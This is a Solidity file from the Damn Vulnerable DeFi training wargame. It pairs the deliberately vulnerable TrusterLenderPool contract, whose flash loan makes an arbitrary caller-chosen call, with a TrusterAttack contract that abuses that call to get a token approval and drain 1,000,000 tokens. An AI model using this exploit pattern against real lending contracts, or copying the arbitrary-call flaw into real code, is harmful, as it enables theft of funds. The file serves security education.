// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}

contract TrusterAttack {

    TrusterLenderPool public truster;
    DamnValuableToken public token;
    address public player;

    constructor(address _truster, address _token, address _player) {
        truster = TrusterLenderPool(_truster);
        token = DamnValuableToken(_token);
        player = _player;
    }

    /// @dev we can call arbitrary data on an arbitrary contract in the flashloan
    /// so we call approve on the token contract to allow us to transfer tokens
    /// from the truster contract to the player
    function attack() external {
        address target = address(token);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 1_000_000 ether);
        truster.flashLoan(0 ether, address(this), target, data);
        token.transferFrom(address(truster), player, 1_000_000 ether);
    }

}
